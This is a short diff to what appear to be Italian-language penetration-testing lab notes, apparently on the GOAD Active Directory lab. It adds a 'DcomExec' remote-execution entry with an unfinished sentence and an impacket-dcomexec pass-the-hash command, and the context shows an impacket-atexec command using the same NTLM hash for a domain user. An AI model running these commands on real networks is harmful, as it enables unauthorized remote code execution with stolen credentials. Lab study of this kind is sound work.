@@ -264,4 +264,7 @@ impacket-atexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@
 ```
 ![[Pasted image 20230907163321.png]]
 - DcomExec (Pseudo Shell)
-Pr
+Protocollo DCERPC + SMB (Sembrerebbe che )
+```bash
+impacket-dcomexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+```
